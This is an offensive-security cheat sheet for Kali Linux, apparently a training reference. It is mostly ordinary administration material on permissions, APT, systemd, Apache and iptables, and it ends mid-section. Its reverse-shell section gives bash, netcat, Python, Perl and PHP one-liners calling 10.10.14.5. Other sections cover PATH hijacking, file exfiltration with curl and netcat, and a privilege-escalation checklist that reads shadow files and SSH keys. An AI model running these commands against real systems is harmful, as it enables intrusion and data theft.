# Kali Linux & Offensive Security — Master Cheat Sheet

---

## 1. Filesystem Hierarchy (FHS)

| Path | Contents |
|---|---|
| `/` | Root of the single tree |
| `/bin` | Essential user binaries |
| `/sbin` | System binaries (root) |
| `/etc` | Configuration files |
| `/home` | User home directories |
| `/root` | Root's home |
| `/tmp` | Temporary files (wiped on boot, world-writable) |
| `/var` | Variable data (logs, spools, caches) |
| `/usr` | User applications and libraries |
| `/dev` | Device files |
| `/proc` | Kernel/process virtual FS |
| `/sys` | Hardware virtual FS |
| `/opt` | Third-party applications |
| `/srv` | Server data |
| `/mnt`, `/media` | Mount points |

**High-value targets:**
```bash
/etc/passwd              # user accounts
/etc/shadow              # password hashes (root only)
/etc/ssh/sshd_config     # SSH config
/var/log/auth.log        # authentication log
/var/log/syslog          # system log
/tmp/                    # writable, often noexec missing
/home/*/.ssh/id_rsa      # private SSH keys
/root/.bash_history      # root command history
```

---

## 2. Device Files: Block vs Character

```bash
ls -l /dev/sda /dev/ttyS0
brw-rw---- 1 root disk    8,  0 /dev/sda    # b = block
crw-rw---- 1 root dialout 4, 64 /dev/ttyS0   # c = character
```

| Type | Marker | Examples |
|---|---|---|
| Block | `b` | disks, partitions (`/dev/sda`, `/dev/sda1`) |
| Character | `c` | keyboards, mice, serial (`/dev/input/event0`, `/dev/ttyS0`) |

```bash
file /dev/sda1          # block special
file /dev/snd/seq       # character special
dd if=/dev/sda of=/tmp/disk.img bs=4M status=progress   # extract disk
```

---

## 3. Command Line Basics

```bash
pwd                     # print working directory
cd /path                # change directory
cd                      # go home
cd -                    # previous directory
cd ..                   # parent directory
ls -la                  # all files, long format
ls -lh                  # human-readable sizes
mkdir dirname           # create directory
rmdir dirname           # remove empty directory
mv src dst              # move/rename
rm file                 # remove file
rm -rf dir              # force recursive delete
cp src dst              # copy file
cp -r src dst           # copy directory
cat file                # print file
less file               # page through
head file               # first 10 lines
tail file               # last 10 lines
tail -f file            # follow live
```

### Redirection
```bash
echo "text" > file      # overwrite
echo "text" >> file     # append
command > file          # stdout to file
command 2> file         # stderr to file
command &> file         # both stdout and stderr
command | tee file      # display and save
```

### PATH hijacking
```bash
echo $PATH              # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
which ls                # /bin/ls
type cd                 # cd is a shell builtin

echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Any script calling 'ls' runs bash instead
```

---

## 4. Search Files & Content

### find
```bash
find /path -name "file"
find /path -name "*.conf"
find / -name "rockyou.txt.gz" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -writable -type f 2>/dev/null            # writable files
find / -writable -type d 2>/dev/null            # writable dirs
find / -user www-data 2>/dev/null
find /path -mtime -7                            # modified last 7 days
find /path -size +100M                          # larger than 100M
find /path -exec command {} \;                  # exec on results
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
```

### locate
```bash
locate filename             # instant (database)
sudo updatedb               # update database
```

### grep
```bash
grep "pattern" file
grep -r "pattern" /path/
grep -i "pattern" file          # case-insensitive
grep -v "pattern" file          # invert
grep -E "regex" file            # extended regex
grep -n "pattern" file          # line numbers
grep -A 3 -B 3 "pattern" file   # 3 lines after/before

grep -ri "password" /etc/ 2>/dev/null
grep -rE "(api_key|apikey|secret)" /var/www/ 2>/dev/null
grep -a "password" binary_file
```

---

## 5. Processes

```bash
ps aux                      # all processes detailed
ps -ef                      # all processes full format
top                         # interactive viewer
htop                        # better viewer
pstree                      # process tree
```

### Job control
```bash
command &                   # background
jobs -l                     # list background jobs
fg %1                       # bring to foreground
bg %1                       # resume in background
Ctrl+Z                      # suspend foreground
```

### Killing
```bash
kill PID                    # TERM
kill -9 PID                 # KILL (force)
kill -15 PID                # TERM (graceful)
killall process_name
pkill pattern
```

| Signal | Number | Meaning |
|---|---|---|
| SIGHUP | 1 | Hangup |
| SIGINT | 2 | Ctrl+C |
| SIGKILL | 9 | Force kill |
| SIGTERM | 15 | Graceful terminate |
| SIGSTOP | 19 | Pause |

### Process inspection
```bash
cat /proc/PID/cmdline       # command line
cat /proc/PID/environ       # environment
ls -l /proc/PID/cwd         # cwd
ls -l /proc/PID/exe         # executable
cat /proc/PID/maps          # memory maps
ls -l /proc/PID/fd          # open fds
```

### Background reverse shell
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &
```

---

## 6. Users, Groups, Permissions

```bash
id                          # uid, gid, groups
whoami
who
w
last
cat /etc/passwd
cat /etc/shadow             # root only
cat /etc/group
getent passwd username
```

### Permission model
- **u** = owner, **g** = group, **o** = others
- **r** = 4, **w** = 2, **x** = 1

| Symbolic | Octal |
|---|---|
| rwx | 7 |
| rw- | 6 |
| r-x | 5 |
| r-- | 4 |
| -wx | 3 |
| -w- | 2 |
| --x | 1 |
| --- | 0 |

### chmod
```bash
chmod 755 file              # rwxr-xr-x
chmod 644 file              # rw-r--r--
chmod 600 file              # rw-------
chmod +x file
chmod u+x file
chmod g-w file
chmod -R 755 dir
chmod 4755 file             # setuid
chmod 2755 file             # setgid
chmod 1777 dir              # sticky
```

### chown / chgrp
```bash
chown user file
chown user:group file
chown -R user:group dir
chgrp group file
```

### Special bits
| Bit | Octal | File effect | Dir effect |
|---|---|---|---|
| setuid | 4000 | Runs as owner | — |
| setgid | 2000 | Runs as group | New files inherit dir group |
| sticky | 1000 | — | Only owner can delete |

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
ls -ld /tmp                 # drwxrwxrwt ('t' = sticky)
```

### umask
```bash
umask                       # e.g., 0022
umask 0077                  # new files 600, dirs 700
umask 0022                  # new files 644, dirs 755
```

Formula: `file = 666 - umask`, `dir = 777 - umask`

### ACLs
```bash
getfacl file
setfacl -m u:user:rwx file
setfacl -x u:user file
```

### Capabilities
```bash
getcap -r / 2>/dev/null
```

---

## 7. System Info & Logs

```bash
free -h
df -h
df -T
du -sh /path
du -h --max-depth=1 /path

uname -a
uname -r
uname -m
hostname
hostnamectl
uptime
date
```

### Kernel logs
```bash
dmesg
dmesg | tail -50
dmesg | grep -i usb
dmesg | grep -i error
```

### systemd journal
```bash
journalctl
journalctl -r               # newest first
journalctl -f               # follow
journalctl -u ssh.service   # specific unit
journalctl --since "1 hour ago"
journalctl -p err           # errors only
journalctl -b               # current boot
journalctl -k               # kernel only

journalctl -u ssh | grep "Failed password"
journalctl -u sudo
journalctl -p err -b
```

### Log files
```bash
/var/log/syslog
/var/log/auth.log           # Debian/Ubuntu
/var/log/secure             # RHEL/CentOS
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/mysql/error.log
```

---

## 8. Hardware Discovery

```bash
lspci
lspci -v
lspci -k
lspci | grep -i ethernet
lspci | grep -i vga
lspci | grep -i wireless

lsusb
lsusb -v
lsusb -t
lsusb | grep -i wireless

lshw
lshw -short
lshw -class network

lsblk
lsblk -f

lscpu
lsscsi
```

---

## 9. File Transfer

```bash
# Download
wget http://10.10.14.5/file
curl -O http://10.10.14.5/file
curl -o output.txt http://10.10.14.5/file

# Upload
curl -X POST -F "file=@localfile" http://10.10.14.5/upload

# SCP
scp file user@host:/path
scp user@host:/path/file .

# Netcat
nc -lvnp 4444 > received_file
nc target 4444 < file_to_send

# Base64
base64 file | ssh user@host "base64 -d > file"
```

---

## 10. Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Netcat
nc -e /bin/bash 10.10.14.5 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 11. Pivoting & Tunneling

```bash
ssh -L 8080:internal_host:80 user@jumphost       # local forward
ssh -R 8080:localhost:80 user@remote             # remote forward
ssh -D 1080 user@jumphost                        # SOCKS proxy

./chisel server -p 8080 --reverse
./chisel client 10.10.14.5:8080 R:socks

socat TCP-LISTEN:8080,fork TCP:internal_host:80
```

---

## 12. Privilege Escalation Checklist

```bash
# System
uname -a
cat /etc/os-release
hostname

# Users
id
cat /etc/passwd
cat /etc/shadow 2>/dev/null
sudo -l

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# Network
netstat -tulpn
ss -tulpn
ip a
ip route

# Processes
ps aux
ps -ef

# Environment
env
cat /proc/self/environ

# History
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

---

## 13. Kali Linux: Identification

```bash
cat /etc/debian_version
cat /etc/os-release
cat /etc/kali_version
uname -a
uname -r
```

---

## 14. Package Management (APT)

```bash
apt update                    # refresh lists
apt full-upgrade              # full system upgrade
apt install <pkg>             # install
apt remove <pkg>              # remove
apt purge <pkg>               # remove + configs
apt autoremove                # remove unused automatic
apt search <keyword>
apt show <pkg>
apt list --installed
apt list --upgradable

apt source <pkg>              # download source
apt build-dep ./              # install build deps
apt --reinstall install <pkg>
```

### dpkg
```bash
dpkg -i pkg.deb               # install local
dpkg -L pkg                   # list files
dpkg -S /path/file            # find owner
dpkg -s pkg                   # status
dpkg -l                       # list all
dpkg -c pkg.deb               # contents
dpkg -I pkg.deb               # info
dpkg -V                       # verify checksums
dpkg --compare-versions 1.2-3 gt 1.1-4; echo $?
dpkg -r pkg                   # remove
dpkg -P pkg                   # purge
dpkg --configure -a           # fix broken
```

### apt-cache
```bash
apt-cache search keyword
apt-cache show package
apt-cache policy package
apt-cache pkgnames
```

### Sources
```
/etc/apt/sources.list
/etc/apt/sources.list.d/
/etc/apt/apt.conf.d/
/etc/apt/preferences
/etc/apt/trusted.gpg.d/
```

### Priorities (apt/preferences)
```
Package: *
Pin: release o=Kali
Pin-Priority: 900

Package: *
Pin: release o=Debian
Pin-Priority: -10
```

| Priority | Behavior |
|---|---|
| < 0 | Never install |
| 0–100 | Only if no other version |
| 100–500 | Only if no newer version |
| 501–990 | Only if no newer in target |
| 990–1000 | Install unless installed is newer |
| > 1000 | Always install, even downgrade |

### Multi-arch
```bash
dpkg --print-architecture
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32
apt install package:architecture
sudo dpkg --remove-architecture i386
```

### Logs
```bash
/var/log/dpkg.log
/var/log/apt/history.log
/var/log/apt/term.log
/var/log/aptitude
```

### Cache
```bash
apt clean
apt autoclean
ls /var/cache/apt/archives/
ls /var/lib/apt/lists/
```

### .deb structure
```
package.deb (ar archive)
├── debian-binary       # format version
├── control.tar.gz      # control, conffiles, md5sums, preinst, postinst, prerm, postrm
└── data.tar.xz         # actual files
```

```bash
ar t package.deb
ar p package.deb control.tar.gz | tar -tzf -
ar p package.deb data.tar.xz | tar -tJf -
dpkg-deb -R package.deb output_dir/
dpkg-deb -b output_dir/ new_package.deb
```

### Conffiles
```bash
apt -o Dpkg::Options::="--force-confold" install pkg    # keep old
apt -o Dpkg::Options::="--force-confnew" install pkg    # use new
apt -o Dpkg::Options::="--force-confdef" install pkg    # auto
```

---

## 15. Services & systemd

```bash
systemctl list-units
systemctl list-units --all
systemctl list-units --type=service
systemctl status
systemctl status postgresql
sudo systemctl start postgresql
sudo systemctl stop postgresql
sudo systemctl restart postgresql
sudo systemctl reload postgresql
sudo systemctl enable postgresql
sudo systemctl disable postgresql
systemctl is-enabled postgresql
systemctl is-active postgresql
```

### Unit file locations
```
/lib/systemd/system/         # packaged
/run/systemd/system/         # runtime
/etc/systemd/system/         # admin overrides
```

### Sample unit
```ini
[Unit]
Description=OpenBSD Secure Shell server
After=network.target auditd.service
ConditionPathExists=!/etc/ssh/sshd_not_to_be_run

[Service]
EnvironmentFile=-/etc/default/ssh
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
Restart=on-failure
RestartPreventExitStatus=255
Type=notify

[Install]
WantedBy=multi-user.target
Alias=sshd.service
```

---

## 16. Network Configuration

### NetworkManager
```bash
nmcli dev status
sudo systemctl stop NetworkManager.service
sudo systemctl disable NetworkManager.service
```

### ifupdown — `/etc/network/interfaces`
```
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp

auto eth0
iface eth0 inet static
    address 192.168.0.3
    netmask 255.255.255.0
    broadcast 192.168.0.255
    network 192.168.0.0
    gateway 192.168.0.1

auto wlan0
iface wlan0 inet dhcp
    wpa-ssid myssid
    wpa-psk <psk_hash>
```

```bash
wpa_passphrase myssid wpa-password
sudo ifdown eth0
sudo ifup eth0
```

### systemd-networkd — `/etc/systemd/network/50-static.network`
```ini
[Match]
Name=enp2s0

[Network]
Address=192.168.0.15/24
Gateway=192.168.0.1
DNS=8.8.8.8
```

```bash
sudo systemctl enable systemd-networkd
sudo systemctl enable systemd-resolved
sudo systemctl start systemd-networkd
sudo systemctl start systemd-resolved
sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
```

### Network checks
```bash
ss -tulpn
ss -tunap
netstat -tulpn
ip a
ifconfig
ip route
route -n
cat /etc/resolv.conf
resolvectl status
```

---

## 17. SSH

```bash
sudo systemctl start ssh
sudo systemctl enable ssh
sudo systemctl reload ssh
```

### `/etc/ssh/sshd_config`
```
Port 22
PasswordAuthentication no
PermitRootLogin no
AllowUsers user1 user2
```

### Regenerate host keys
```bash
sudo rm /etc/ssh/ssh_host_*
sudo dpkg-reconfigure openssh-server
sudo systemctl restart ssh
```

---

## 18. PostgreSQL

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo systemctl status postgresql
```

**Config:** `/etc/postgresql/version/cluster-name/`
**Defaults:** TCP `localhost:5432`, socket `/var/run/postgresql/.s.PGSQL.5432`

```bash
sudo su - postgres
createuser -P username
createdb -T template0 -E UTF-8 -O username dbname
exit

psql -h localhost -U username dbname

pg_lsclusters
pg_upgradecluster old-version cluster-name
pg_dropcluster version cluster-name
pg_createcluster version cluster-name
```

---

## 19. Apache

```bash
sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl reload apache2
```

**Defaults:** port 80 (`/etc/apache2/ports.conf`), serves `/var/www/html/`

```bash
sudo a2enmod ssl
sudo a2dismod ssl
sudo a2ensite www.example.com
sudo a2dissite www.example.com
```

### Virtual host
```apache
<VirtualHost *:80>
    ServerName www.kali.org
    ServerAlias kali.org
    DocumentRoot /srv/www.kali.org/www
    CustomLog /var/log/apache2/www.kali.org-access.log combined
    ErrorLog /var/log/apache2/www.kali.org-error.log
</VirtualHost>
```

### Directory block
```apache
<Directory /var/www>
    Options Includes FollowSymLinks
    AllowOverride All
    DirectoryIndex index.php index.html index.htm
</Directory>
```

| Option | Effect |
|---|---|
| ExecCGI | Allow CGI |
| FollowSymLinks | Follow symlinks |
| SymLinksIfOwnerMatch | Follow only if same owner |
| Includes | Server Side Includes |
| Indexes | Directory listing |
| MultiViews | Content negotiation |
| None | Disable all |
| All | Enable all except MultiViews |

### Basic auth
```apache
Require valid-user
AuthName "Private directory"
AuthType Basic
AuthUserFile /etc/apache2/authfiles/htpasswd-private
```

```bash
sudo htpasswd /etc/apache2/authfiles/htpasswd-private user
sudo htpasswd -c /etc/apache2/authfiles/htpasswd-private user
```

### IP restriction
```apache
Require ip 192.168.0.0/16
```

---

## 20. User & Group Management

```bash
sudo adduser username
sudo passwd username
sudo usermod -a -G sudo username
sudo adduser username groupname

sudo passwd -l username         # lock
sudo passwd -u username         # unlock
sudo passwd -e username         # force change
sudo chsh -s /bin/bash username
sudo chage -l username

sudo addgroup groupname
sudo delgroup groupname
sudo groupmod -g 1500 groupname
sudo gpasswd groupname
sudo gpasswd -r groupname

newgrp groupname
sg groupname -c "command"
id
getent passwd username
```

**setgid directory:**
```bash
sudo chmod g+s /shared/directory
ls -ld /shared/directory       # drwxrwsr-x
```

---

## 21. Firewall (iptables)

### Tables
| Table | Purpose |
|---|---|
| filter | Accept/reject/drop (default) |
| nat | Address/port translation |
| mangle | Modify packets |
| raw | Pre-connection-tracking |

### Chains (filter)
| Chain | Handles |
|---|---|
| INPUT | To firewall |
| OUTPUT | From firewall |
| FORWARD | Through firewall |

### Actions
| Action | Effect |
|---|---|
| ACCEPT | Allow |
| REJECT | Reject with ICMP |
| DROP | Silent discard |
| LOG | Log (continue processing) |
| SNAT/DNAT | NAT (nat table) |
| MASQUERADE | Special SNAT |
| REDIRECT | Redirect to local port |

### Commands
```bash
iptables -L
iptables -n -L
iptables -n -L --line-numbers
iptables -A INPUT -s IP -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -P INPUT DROP
iptables -F
iptables -D INPUT 2
iptables-save
iptables-restore < file
```

### Practical
```bash
iptables -A INPUT -s 10.0.1.5 -j DROP
iptables -A INPUT -s 31.13.74.0/24 -j DROP

iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 443 -j ACCEPT

iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport 22 -j ACCEPT
```

### Persist
```
# /etc/network/interfaces
auto eth0
iface eth0 inet dhcp
    pre-up iptables-restore < /usr/local/etc/myconfig.fw
```

### NAT / AP
```bash
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 22. Monitoring & File Integrity

### top
| Key | Effect |
|---|---|
| P | Sort by CPU |
| M | Sort by memory |
| T | Sort by time |
| N | Sort by PID |
| k | Kill process |
| r | Renice |

### logcheck
```bash
sudo apt install logcheck
sudo -u logcheck logcheck -o
```
Config: `/etc/logcheck/`
Modes: `paranoid`, `server`, `workstation`

### AIDE
```bash
sudo apt install aide
sudo aideinit
sudo aide --check
```
Database: `/var/lib/aide/aide.db`
Config: `/etc/aide/aide.conf`

### Tripwire
```bash
sudo apt install tripwire
sudo twadmin -m P /etc/tripwire/twpol.txt
sudo tripwire --init
sudo tripwire --check
sudo tripwire --update-policy -Z low /etc/tripwire/twpol.txt
```

### chkrootkit / rkhunter
```bash
sudo chkrootkit
sudo rkhunter --check
```

### fail2ban
```bash
sudo apt install fail2ban
fail2ban-client status
```

---

## 23. Documentation & Bug Reporting

### Man pages
```bash
man command
man 2 read
man 5 shadow
man -k keyword
apropos "copy file"
whatis command
pinfo command
```

| Section | Contents |
|---|---|
| 1 | Commands |
| 2 | System calls |
| 3 | Library functions |
| 4 | Devices |
| 5 | Config files |
| 6 | Games |
| 7 | Macros |
| 8 | Admin commands |
| 9 | Kernel routines |

### Package docs
```bash
/usr/share/doc/package/README.Debian
/usr/share/doc/package/changelog.Debian.gz
/usr/share/doc/package/NEWS.Debian.gz
/usr/share/doc/package/examples/
/usr/share/doc/package/copyright
```

### Bug filing
```bash
reportbug --configure
reportbug package
```

**Trackers:**
- Kali: `https://bugs.kali.org/`
- Debian: `https://bugs.debian.org/`
- Submission: `submit@bugs.debian.org`

### IRC
```bash
irssi
/server irc.oftc.net 6697
/join #kali-linux
```

---

## 24. Advanced Package Modification

```bash
# Enable source repos
deb-src http://http.kali.org/kali kali-rolling main contrib non-free

apt update
apt source package-name

# Or specific version
dget http://http.kali.org/pool/main/.../package.dsc
dpkg-source -x package.dsc
dget -u URL
dget --download-only URL

# From Git
git clone https://gitlab.com/kalilinux/packages/package-name.git

# Install build deps
cd package-source/
sudo apt build-dep ./

# Bump version
export DEBFULLNAME="Your Name"
export DEBEMAIL="you@example.com"
dch --local yourname
dch -v 7.4.5-0yourname1 "New upstream release"

# Apply patch
patch -p1 < /tmp/fix.patch
dpkg-source --commit

# Build
dpkg-buildpackage -us -uc -b
debuild -us -uc -b
```

---

## 25. Kernel Recompilation

```bash
sudo apt install build-essential libncurses5-dev fakeroot

apt-cache search ^linux-source
sudo apt install linux-source-5.10

mkdir ~/kernel && cd ~/kernel
tar -xaf /usr/src/linux-source-5.10.tar.xz
cd linux-source-5.10

cp /boot/config-$(uname -r) .config
make x86_64_defconfig
make menuconfig
make oldconfig
make olddefconfig
make oldnoconfig

make clean
make distclean

export CONCURRENCY_LEVEL=$(nproc)
make deb-pkg LOCALVERSION=-custom KDEB_PKGVERSION=$(make kernelversion)-1

sudo dpkg -i ../linux-image-*.deb
sudo dpkg -i ../linux-headers-*.deb
```

| Package | Contents |
|---|---|
| linux-image-version | Kernel + modules |
| linux-headers-version | Headers |
| linux-firmware-image-version | Firmware |
| linux-image-version-dbg | Debug symbols |
| linux-libc-dev | User-space headers |

---

## 26. Live Build (Custom ISO)

```bash
sudo apt install curl git live-build
git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
cd live-build-config

./build.sh --verbose
./build.sh --variant kde --verbose

# Customize:
#   kali-config/common/package-lists/*.list.chroot
#   kali-config/common/packages.chroot/
#   kali-config/common/preseed/
#   kali-config/common/hooks/live/*.chroot
#   kali-config/common/hooks/live/*.binary
#   kali-config/common/includes.chroot/
#   kali-config/common/includes.binary/
```

### Metapackages
| Package | Contents |
|---|---|
| kali-linux-core | Base |
| kali-linux-headless | CLI |
| kali-linux-default | Default |
| kali-linux-large | Wider |
| kali-linux-everything | All |
| kali-tools-top10 | Top 10 |
| kali-tools-web | Web |
| kali-tools-passwords | Passwords |
| kali-tools-wireless | Wireless |
| kali-tools-forensics | Forensics |
| kali-tools-gpu | GPU |

---

## 27. USB Persistence

### Unencrypted
```bash
parted -a optimal /dev/sdb mkpart primary END_MB 100%
mkfs.ext4 -L persistence /dev/sdb3
mkdir -p /mnt/usb
mount /dev/sdb3 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Encrypted
```bash
cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3
cryptsetup luksOpen /dev/sdb3 kali_persistence
mkfs.ext4 -L persistence /dev/mapper/kali_persistence
mount /dev/mapper/kali_persistence /mnt
echo "/ union" > /mnt/persistence.conf
umount /mnt
cryptsetup luksClose /dev/mapper/kali_persistence
```

### Nuke password
```bash
sudo apt install cryptsetup-nuke-password
sudo dpkg-reconfigure cryptsetup-nuke-password
```

---

## 28. Enterprise: PXE Boot

**`/etc/dnsmasq.conf`:**
```
interface=eth0
dhcp-range=192.168.101.100,192.168.101.200,12h
dhcp-option=option:router,192.168.101.1
dhcp-option=option:dns-server,8.8.8.8,8.8.4.4
dhcp-boot=pxelinux.0
enable-tftp
tftp-root=/tftpboot/
```

```bash
mkdir /tftpboot
cd /tftpboot
wget http://http.kali.org/dists/kali-rolling/main/installer-amd64/current/images/netboot/netboot.tar.gz
tar xf netboot.tar.gz
```

**`debian-installer/amd64/txt.cfg`:**
```
label install
    menu label ^Install
    kernel debian-installer/amd64/linux
    append vga=788 initrd=debian-installer/amd64/initrd.gz --- quiet language=en country=US keymap=us hostname=kali domain= url=http://192.168.101.1/preseed.cfg
```

---

## 29. Enterprise: SaltStack

```bash
# Master
sudo apt install salt-master
sudo systemctl enable --now salt-master
salt-key --list all
salt-key --accept minion-id

# Minion
sudo apt install salt-minion
echo "master: 192.168.122.105" >> /etc/salt/minion
echo "minion-id" > /etc/salt/minion_id
sudo systemctl enable --now salt-minion

# Remote execution
salt '*' test.ping
salt '*' cmd.shell 'uptime; uname -a'
salt '*' cmd.run_bg template=jinja 'command {{ grains.id }}'
salt '*' pkg.refresh_db
salt '*' pkg.upgrade dist_upgrade=True
salt '*' service.enable ssh
salt '*' service.start ssh
salt kali-scratch sys.doc disk.usage
salt kali-scratch state.apply offsec
salt kali-scratch state.highstate
```

**`/srv/salt/offsec.sls`:**
```yaml
offsec_repository:
  pkgrepo.managed:
    - name: deb http://pkgrepo.offsec.com offsec-internal main
    - file: /etc/apt/sources.list.d/offsec.list
    - key_url: salt://offsec-apt-key.asc
    - require_in:
      - pkg: offsec-defaults

offsec-defaults:
  pkg.installed

ssh_key_for_root:
  ssh_auth.present:
    - user: root
    - name: ssh-rsa AAAAB3NzaC1yc2...89C4N user@host
```

**`/srv/salt/top.sls`:**
```yaml
base:
  kali-scratch:
    - offsec
```

---

## 30. Enterprise: reprepro Repository

```bash
sudo apt install reprepro gnupg
sudo adduser --system --group pkgrepo
sudo chown pkgrepo $(tty)
sudo su - -s /bin/bash pkgrepo
gpg --gen-key
# (empty passphrase)

mkdir -p reprepro/conf
cd reprepro
```

**`conf/distributions`:**
```
Codename: offsec-internal
AlsoAcceptFor: unstable
Origin: OffSec
Description: Offsec's Internal packages
Architectures: source amd64 i386
Components: main
SignWith: F8FE22F74F1B714E38DA6181B27F74F7B4EF2D0D
```

```bash
reprepro export
reprepro include offsec-internal /tmp/package.changes
```

**Apache vhost:**
```apache
<VirtualHost *:80>
    ServerName pkgrepo.offsec.com
    DocumentRoot /home/pkgrepo/reprepro
    <Directory "/home/pkgrepo/reprepro">
        Options Indexes FollowSymLinks MultiViews
        Require all granted
        AllowOverride All
    </Directory>
</VirtualHost>
```

**Client:**
```
deb http://pkgrepo.offsec.com offsec-internal main
```

```bash
gpg --export --armor repoadmin@offsec.com > /tmp/wot.asc
cat /tmp/wot.asc | apt-key add -
apt-key list
```

---

## 31. Security Assessment: CIA Triad

| Attribute | Question |
|---|---|
| Confidentiality | Can unauthorized actors read? |
| Integrity | Can data be modified? |
| Availability | Is it accessible when needed? |

---

## 32. Vulnerability vs Exploit

| Term | Definition |
|---|---|
| Vulnerability | Flaw compromising CIA |
| Exploit | Software taking advantage of a vulnerability |

**Vulnerability classes:**
| Class | Description |
|---|---|
| File Inclusion | Web app includes attacker file |
| SQL Injection | Unsanitized input → SQL execution |
| Buffer Overflow | Write past allocated buffer |
| Race Condition | Timing manipulation |

---

## 33. Assessment Types

| Type | Goal | Starts with |
|---|---|---|
| Vulnerability Assessment | Inventory of issues | Scan |
| Compliance Test | Framework compliance | Vulnerability scan |
| Traditional Pentest | Improve posture | Goal |
| Application Assessment | Single app | Black/white box |

**Signature outcomes:**
| Outcome | Meaning |
|---|---|
| True Positive | Vulnerability exists, detected |
| False Positive | No vuln, flagged |
| True Negative | No vuln, not flagged |
| False Negative | Vulnerability exists, NOT detected |

**Risk = Likelihood × Impact**

| Likelihood | Adversary | Controls |
|---|---|---|
| High | Skilled, motivated | Insufficient |
| Medium | Motivated, skilled | May impede |
| Low | Unskilled/unmotivated | Effective |

| Impact | Consequence |
|---|---|
| High | Financial loss, mission harm, injury, death |
| Medium | Financial loss, mission harm, injury |
| Low | Some financial loss |

---

## 34. Assessment Phases

| Phase | Purpose | Kali Category |
|---|---|---|
| Information Gathering | Passive recon | Information Gathering |
| Vulnerability Discovery | Active scanning | Vulnerability Analysis, Web App Analysis, Database Assessment, Reverse Engineering |
| Exploitation | Gain foothold | Web App Analysis, Database Assessment, Password Attacks, Exploitation Tools |
| Pivoting & Exfiltration | Escalate, move, extract | Password Attacks, Exploitation Tools, Sniffing & Spoofing, Post Exploitation |
| Reporting | Document | Reporting Tools |

---

## 35. Attack Types

| Attack | Cause | Effect |
|---|---|---|
| SQL Injection | Unsanitized input | Extract DB, take over server |
| XSS | Unsanitized input | Execute code in victim browser |
| Stack Buffer Overflow | Write past stack buffer | Crash or code execution |
| Heap Corruption | Manipulate heap pointers | Code execution |
| Integer Overflow | Value exceeds storage | Unpredictable behavior |
| Format String | Unsanitized format tokens | Reveal/overwrite memory |
| DoS | Resource exhaustion or PoC | Service unavailability |
| Password Attacks (online) | Try passwords | Noisy, lockout |
| Password Attacks (offline) | Crack hashes | GPU-accelerated |
| Client-Side | Malicious page | Code execution on workstation |

---

## 36. Tool Categories

| Category | Tools |
|---|---|
| Information Gathering | nmap, masscan, dnsrecon, theHarvester, recon-ng |
| Vulnerability Analysis | nikto, OpenVAS, lynis, unix-privesc-check |
| Web Application Analysis | burpsuite, gobuster, ffuf, sqlmap, wpscan, feroxbuster |
| Database Assessment | sqlmap, oscanner, jsql-injection |
| Password Attacks | hydra, john, hashcat, medusa, crunch, cewl |
| Wireless Attacks | aircrack-ng, wifite, kismet, reaver, bully |
| Reverse Engineering | ghidra, radare2, gdb, objdump, strings, ltrace, strace |
| Exploitation Tools | metasploit, searchsploit, msfvenom, exploitdb |
| Sniffing & Spoofing | wireshark, tcpdump, ettercap, bettercap, responder |
| Post Exploitation | meterpreter, powershell-empire, crackmapexec, impacket |
| Forensics | autopsy, sleuthkit, volatility, foremost, binwalk |
| Reporting Tools | dradis, faraday, cherrytree |
| Social Engineering | set, gophish, maltego |

---

## 37. Download & Verify Kali ISO

```bash
# Download
